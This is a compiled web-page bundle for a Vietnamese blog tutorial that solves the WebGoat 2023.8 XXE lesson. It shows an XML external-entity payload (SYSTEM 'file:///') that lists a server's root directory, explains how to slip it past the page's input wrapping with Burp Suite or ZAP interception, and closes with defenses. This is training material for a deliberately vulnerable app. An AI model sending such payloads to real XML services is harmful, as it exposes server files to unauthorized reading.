"use strict";(globalThis.webpackChunktiennhm_github_io=globalThis.webpackChunktiennhm_github_io||[]).push([[97035],{16391:(n,e,t)=>{t.r(e),t.d(e,{assets:()=>o,contentTitle:()=>h,default:()=>d,frontMatter:()=>r,metadata:()=>i,toc:()=>l});const i=JSON.parse('{"id":"web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-05","title":"1.05 | XXE","description":"B\xe0i vi\u1ebft n\xe0y s\u1ebd h\u01b0\u1edbng d\u1eabn c\xe1ch t\u1ea5n c\xf4ng XXE tr\xean WebGoat 2023.8","source":"@site/docs/02-web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-05.md","sourceDirName":"02-web-security/webgoat-2023.8/A5-Security-Misconfiguration","slug":"/web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-05","permalink":"/docs/web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-05","draft":false,"unlisted":false,"editUrl":"https://github.com/TienNHM/tiennhm.github.io/tree/master/docs/02-web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-05.md","tags":[{"inline":true,"label":"web-security","permalink":"/docs/tags/web-security"},{"inline":true,"label":"webgoat","permalink":"/docs/tags/webgoat"},{"inline":true,"label":"security-misconfiguration","permalink":"/docs/tags/security-misconfiguration"},{"inline":true,"label":"xxe","permalink":"/docs/tags/xxe"},{"inline":true,"label":"webgoat-2023.8","permalink":"/docs/tags/webgoat-2023-8"}],"version":"current","lastUpdatedAt":1770651021000,"sidebarPosition":1,"frontMatter":{"title":"1.05 | XXE","slug":"XXE-05","description":"B\xe0i vi\u1ebft n\xe0y s\u1ebd h\u01b0\u1edbng d\u1eabn c\xe1ch t\u1ea5n c\xf4ng XXE tr\xean WebGoat 2023.8","image":"https://tiennhm.github.io/img/docs/database.jpg","sidebar_position":1,"tags":["web-security","webgoat","security-misconfiguration","xxe","webgoat-2023.8"],"keywords":["web-security","webgoat","security-misconfiguration","xxe","webgoat-2023.8"],"enableComments":true,"draft":false},"sidebar":"tutorialSidebar","previous":{"title":"1.04 | XXE","permalink":"/docs/web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-04"},"next":{"title":"1.06 | XXE","permalink":"/docs/web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-06"}}');var s=t(74848),c=t(28453);const r={title:"1.05 | XXE",slug:"XXE-05",description:"B\xe0i vi\u1ebft n\xe0y s\u1ebd h\u01b0\u1edbng d\u1eabn c\xe1ch t\u1ea5n c\xf4ng XXE tr\xean WebGoat 2023.8",image:"https://tiennhm.github.io/img/docs/database.jpg",sidebar_position:1,tags:["web-security","webgoat","security-misconfiguration","xxe","webgoat-2023.8"],keywords:["web-security","webgoat","security-misconfiguration","xxe","webgoat-2023.8"],enableComments:!0,draft:!1},h=void 0,o={},l=[{value:"\ud83c\udfaf <strong>M\u1ee5c ti\xeau b\xe0i t\u1eadp</strong>",id:"-m\u1ee5c-ti\xeau-b\xe0i-t\u1eadp",level:2},{value:"\ud83d\udd25 <strong>1. Ph\xe2n t\xedch y\xeau c\u1ea7u</strong>",id:"-1-ph\xe2n-t\xedch-y\xeau-c\u1ea7u",level:2},{value:"<strong>\ud83d\udccc Request ban \u0111\u1ea7u khi g\u1eedi comment b\xecnh th\u01b0\u1eddng</strong>",id:"-request-ban-\u0111\u1ea7u-khi-g\u1eedi-comment-b\xecnh-th\u01b0\u1eddng",level:3},{value:"\ud83d\ude80 <strong>2. Th\u1ef1c hi\u1ec7n XXE Injection</strong>",id:"-2-th\u1ef1c-hi\u1ec7n-xxe-injection",level:2},{value:"<strong>\ud83d\udccc C\xe1ch g\u1eedi payload XXE</strong>",id:"-c\xe1ch-g\u1eedi-payload-xxe",level:3},{value:"\u274c <strong>3. L\u1ed7i g\u1eb7p ph\u1ea3i v\xe0 c\xe1ch bypass</strong>",id:"-3-l\u1ed7i-g\u1eb7p-ph\u1ea3i-v\xe0-c\xe1ch-bypass",level:2},{value:"\ud83d\udee0 <strong>4. C\xe1ch kh\u1eafc ph\u1ee5c</strong>",id:"-4-c\xe1ch-kh\u1eafc-ph\u1ee5c",level:2},{value:"\ud83c\udfaf <strong>5. Ki\u1ec3m tra ph\u1ea3n h\u1ed3i</strong>",id:"-5-ki\u1ec3m-tra-ph\u1ea3n-h\u1ed3i",level:2},{value:"\ud83d\udee1 <strong>6. C\xe1ch ph\xf2ng ch\u1ed1ng XXE</strong>",id:"-6-c\xe1ch-ph\xf2ng-ch\u1ed1ng-xxe",level:2}];function a(n){const e={blockquote:"blockquote",code:"code",h2:"h2",h3:"h3",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,c.R)(),...n.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsxs)(e.blockquote,{children:["\n",(0,s.jsxs)(e.p,{children:["\ud83d\udee0 ",(0,s.jsx)(e.strong,{children:"XXE Injection - Gi\u1ea3i ph\xe1p ho\xe0n ch\u1ec9nh"})]}),"\n"]}),"\n",(0,s.jsxs)(e.h2,{id:"-m\u1ee5c-ti\xeau-b\xe0i-t\u1eadp",children:["\ud83c\udfaf ",(0,s.jsx)(e.strong,{children:"M\u1ee5c ti\xeau b\xe0i t\u1eadp"})]}),"\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsxs)(e.li,{children:[(0,s.jsx)(e.strong,{children:"Li\u1ec7t k\xea th\u01b0 m\u1ee5c g\u1ed1c c\u1ee7a h\u1ec7 th\u1ed1ng"})," b\u1eb1ng XXE Injection."]}),"\n",(0,s.jsxs)(e.li,{children:[(0,s.jsx)(e.strong,{children:"Ph\xe1t hi\u1ec7n v\xe0 bypass c\u01a1 ch\u1ebf ki\u1ec3m tra \u0111\u1ea7u v\xe0o"})," c\u1ee7a WebGoat."]}),"\n",(0,s.jsxs)(e.li,{children:[(0,s.jsx)(e.strong,{children:"Ch\u1eb7n v\xe0 ch\u1ec9nh s\u1eeda request HTTP"})," \u0111\u1ec3 th\u1ef1c hi\u1ec7n t\u1ea5n c\xf4ng."]}),"\n"]}),"\n",(0,s.jsxs)(e.h2,{id:"-1-ph\xe2n-t\xedch-y\xeau-c\u1ea7u",children:["\ud83d\udd25 ",(0,s.jsx)(e.strong,{children:"1. Ph\xe2n t\xedch y\xeau c\u1ea7u"})]}),"\n",(0,s.jsx)(e.h3,{id:"-request-ban-\u0111\u1ea7u-khi-g\u1eedi-comment-b\xecnh-th\u01b0\u1eddng",children:(0,s.jsx)(e.strong,{children:"\ud83d\udccc Request ban \u0111\u1ea7u khi g\u1eedi comment b\xecnh th\u01b0\u1eddng"})}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-http",children:'POST /WebGoat/xxe/simple\nContent-Type: application/xml\n\n<?xml version="1.0"?>\n<comment>\n  <text>This is my first comment, nice picture</text>\n</comment>\n'})}),"\n",(0,s.jsxs)(e.p,{children:["\ud83d\udc49 ",(0,s.jsx)(e.strong,{children:"Nh\u1eadn x\xe9t:"})]}),"\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsxs)(e.li,{children:["Request \u0111\u01b0\u1ee3c g\u1eedi d\u01b0\u1edbi d\u1ea1ng ",(0,s.jsx)(e.strong,{children:"XML"}),"."]}),"\n",(0,s.jsx)(e.li,{children:"Comment \u0111\u01b0\u1ee3c hi\u1ec3n th\u1ecb tr\xean trang web sau khi g\u1eedi."}),"\n",(0,s.jsxs)(e.li,{children:[(0,s.jsx)(e.strong,{children:"Ch\xfang ta c\u1ea7n ch\u1ec9nh s\u1eeda request n\xe0y \u0111\u1ec3 th\u1ef1c hi\u1ec7n XXE Injection"}),"."]}),"\n"]}),"\n",(0,s.jsxs)(e.h2,{id:"-2-th\u1ef1c-hi\u1ec7n-xxe-injection",children:["\ud83d\ude80 ",(0,s.jsx)(e.strong,{children:"2. Th\u1ef1c hi\u1ec7n XXE Injection"})]}),"\n",(0,s.jsx)(e.h3,{id:"-c\xe1ch-g\u1eedi-payload-xxe",children:(0,s.jsx)(e.strong,{children:"\ud83d\udccc C\xe1ch g\u1eedi payload XXE"})}),"\n",(0,s.jsxs)(e.p,{children:["Ch\u1eb7n request b\u1eb1ng ",(0,s.jsx)(e.strong,{children:"Burp Suite/ZAP Proxy"}),", sau \u0111\xf3 thay th\u1ebf body nh\u01b0 sau:"]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-http",children:'POST /WebGoat/xxe/simple\nContent-Type: application/xml\n\n<?xml version="1.0"?>\n<!DOCTYPE user [<!ENTITY root SYSTEM "file:///"> ]>\n<comment>\n  <text>&root;</text>\n</comment>\n'})}),"\n",(0,s.jsxs)(e.p,{children:["\u2705 ",(0,s.jsx)(e.strong,{children:"Gi\u1ea3i th\xedch:"})]}),"\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsxs)(e.li,{children:[(0,s.jsx)(e.strong,{children:(0,s.jsx)(e.code,{children:"<!DOCTYPE user [...]>"})}),": Khai b\xe1o ",(0,s.jsx)(e.strong,{children:"DOCTYPE"})," \u0111\u1ec3 s\u1eed d\u1ee5ng entities."]}),"\n",(0,s.jsxs)(e.li,{children:[(0,s.jsx)(e.strong,{children:(0,s.jsx)(e.code,{children:'<!ENTITY root SYSTEM "file:///">'})}),": \u0110\u1ecdc th\u01b0 m\u1ee5c g\u1ed1c c\u1ee7a h\u1ec7 th\u1ed1ng."]}),"\n",(0,s.jsxs)(e.li,{children:[(0,s.jsx)(e.strong,{children:(0,s.jsx)(e.code,{children:"<text>&root;</text>"})}),": Ch\xe8n n\u1ed9i dung th\u01b0 m\u1ee5c v\xe0o ph\u1ea3n h\u1ed3i."]}),"\n"]}),"\n",(0,s.jsxs)(e.h2,{id:"-3-l\u1ed7i-g\u1eb7p-ph\u1ea3i-v\xe0-c\xe1ch-bypass",children:["\u274c ",(0,s.jsx)(e.strong,{children:"3. L\u1ed7i g\u1eb7p ph\u1ea3i v\xe0 c\xe1ch bypass"})]}),"\n",(0,s.jsx)(e.p,{children:"N\u1ebfu d\xe1n tr\u1ef1c ti\u1ebfp payload v\xe0o \xf4 nh\u1eadp comment, ta nh\u1eadn \u0111\u01b0\u1ee3c l\u1ed7i:"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-json",children:'{\n  "lessonCompleted" : false,\n  "feedback" : "Sorry the solution is not correct, please try again.",\n  "output" : "...javax.xml.stream.XMLStreamException: ParseError at [row,col]:[1,44]\\\\nMessage: The processing instruction target matching \\\\\\"[xX][mM][lL]\\\\\\" is not allowed.]"\n}\n'})}),"\n",(0,s.jsxs)(e.p,{children:["\ud83d\udc49 ",(0,s.jsx)(e.strong,{children:"L\xfd do:"})]}),"\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsxs)(e.li,{children:["JavaScript tr\xean trang web t\u1ef1 \u0111\u1ed9ng ",(0,s.jsxs)(e.strong,{children:["b\u1ecdc n\u1ed9i dung input v\xe0o c\u1eb7p ",(0,s.jsx)(e.code,{children:"<text>...</text>"})]}),"."]}),"\n",(0,s.jsxs)(e.li,{children:["\u0110i\u1ec1u n\xe0y khi\u1ebfn ",(0,s.jsx)(e.strong,{children:"XML c\u1ee7a ch\xfang ta b\u1ecb l\u1ed7i khi g\u1eedi \u0111i"}),"."]}),"\n"]}),"\n",(0,s.jsxs)(e.h2,{id:"-4-c\xe1ch-kh\u1eafc-ph\u1ee5c",children:["\ud83d\udee0 ",(0,s.jsx)(e.strong,{children:"4. C\xe1ch kh\u1eafc ph\u1ee5c"})]}),"\n",(0,s.jsxs)(e.p,{children:["\u2705 ",(0,s.jsx)(e.strong,{children:"D\xf9ng Burp Suite ho\u1eb7c ZAP \u0111\u1ec3 ch\u1eb7n v\xe0 ch\u1ec9nh s\u1eeda request"}),":"]}),"\n",(0,s.jsxs)(e.ol,{children:["\n",(0,s.jsxs)(e.li,{children:[(0,s.jsx)(e.strong,{children:"B\u1eadt Intercept Mode trong Burp/ZAP"}),"."]}),"\n",(0,s.jsxs)(e.li,{children:[(0,s.jsx)(e.strong,{children:"G\u1eedi m\u1ed9t comment b\xecnh th\u01b0\u1eddng"}),"."]}),"\n",(0,s.jsxs)(e.li,{children:[(0,s.jsx)(e.strong,{children:"Ch\u1ec9nh s\u1eeda request trong Intercept v\xe0 thay th\u1ebf to\xe0n b\u1ed9 body b\u1eb1ng payload XXE"}),"."]}),"\n",(0,s.jsxs)(e.li,{children:[(0,s.jsx)(e.strong,{children:"G\u1eedi l\u1ea1i request v\xe0 ki\u1ec3m tra ph\u1ea3n h\u1ed3i"}),"."]}),"\n"]}),"\n",(0,s.jsxs)(e.h2,{id:"-5-ki\u1ec3m-tra-ph\u1ea3n-h\u1ed3i",children:["\ud83c\udfaf ",(0,s.jsx)(e.strong,{children:"5. Ki\u1ec3m tra ph\u1ea3n h\u1ed3i"})]}),"\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsxs)(e.li,{children:["N\u1ebfu request th\xe0nh c\xf4ng, server s\u1ebd tr\u1ea3 v\u1ec1 danh s\xe1ch th\u01b0 m\u1ee5c g\u1ed1c (",(0,s.jsx)(e.code,{children:"bin, etc, home..."}),")."]}),"\n",(0,s.jsxs)(e.li,{children:["N\u1ebfu kh\xf4ng, server c\xf3 th\u1ec3 \u0111\xe3 ",(0,s.jsx)(e.strong,{children:"v\xf4 hi\u1ec7u h\xf3a XXE"}),", c\u1ea7n th\u1eed c\xe1ch kh\xe1c."]}),"\n"]}),"\n",(0,s.jsxs)(e.h2,{id:"-6-c\xe1ch-ph\xf2ng-ch\u1ed1ng-xxe",children:["\ud83d\udee1 ",(0,s.jsx)(e.strong,{children:"6. C\xe1ch ph\xf2ng ch\u1ed1ng XXE"})]}),"\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsxs)(e.li,{children:[(0,s.jsx)(e.strong,{children:"V\xf4 hi\u1ec7u h\xf3a DOCTYPE trong XML parser"}),"."]}),"\n",(0,s.jsxs)(e.li,{children:[(0,s.jsxs)(e.strong,{children:["Kh\xf4ng cho ph\xe9p \u0111\u1ecdc external entities (",(0,s.jsx)(e.code,{children:'SYSTEM "file:///"'}),")"]}),"."]}),"\n",(0,s.jsxs)(e.li,{children:[(0,s.jsx)(e.strong,{children:"S\u1eed d\u1ee5ng JSON thay v\xec XML n\u1ebfu c\xf3 th\u1ec3"}),"."]}),"\n",(0,s.jsxs)(e.li,{children:[(0,s.jsx)(e.strong,{children:"D\xf9ng WAF \u0111\u1ec3 ph\xe1t hi\u1ec7n payload XXE"}),"."]}),"\n"]})]})}function d(n={}){const{wrapper:e}={...(0,c.R)(),...n.components};return e?(0,s.jsx)(e,{...n,children:(0,s.jsx)(a,{...n})}):a(n)}},28453:(n,e,t)=>{t.d(e,{R:()=>r,x:()=>h});var i=t(96540);const s={},c=i.createContext(s);function r(n){const e=i.useContext(c);return i.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function h(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(s):n.components||s:r(n.components),i.createElement(c.Provider,{value:e},n.children)}}}]);